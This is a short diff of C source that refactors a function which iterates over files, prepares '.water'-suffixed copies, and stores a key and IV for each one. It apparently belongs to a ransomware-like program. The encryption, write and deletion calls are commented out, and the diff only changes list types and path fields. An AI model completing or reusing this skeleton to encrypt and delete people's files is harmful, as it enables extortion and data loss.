@@ -19,7 +19,7 @@
  * @param encrypted -> type = EncList
  * @param not_encrypted -> type = List
  */
-void encrypt_files(List *files, EncList **encrypted, List **not_encrypted){
+void encrypt_files(List *files, List **encrypted, List **not_encrypted){
     int status;
     FILE *old, *new;
     char* new_name;
@@ -27,10 +27,10 @@ void encrypt_files(List *files, EncList **encrypted, List **not_encrypted){
     char *key;
     while(files != NULL){
 
-        old = fopen(files->path, "rb");
+        old = fopen(files->info[2], "rb");
         if(old != NULL){
-            new_name = (char*) malloc(strlen(files->path) + strlen(".water") + 2);
-            strcpy(new_name, files->path);
+            new_name = (char*) malloc(strlen(files->info[2]) + strlen(".water") + 2);
+            strcpy(new_name, files->info[2]);
             strcat(new_name, ".water");
             //new = fopen(new_name, "wb");
 
@@ -39,14 +39,14 @@ void encrypt_files(List *files, EncList **encrypted, List **not_encrypted){
 
 
             //encrypt(old, new, key, iv);
-            append_encrypted(encrypted, new_name, key, iv);
+            append(encrypted, new_name, key, iv);
             //fclose(new);
             fclose(old);
             free(key);
             free(iv);
             //remove(files->path); // delete the original file
 
-        }else    append(not_encrypted, files->path);
+        }else    append(not_encrypted, files->info[2], NULL, NULL);
 
         files = files->prox;
     }
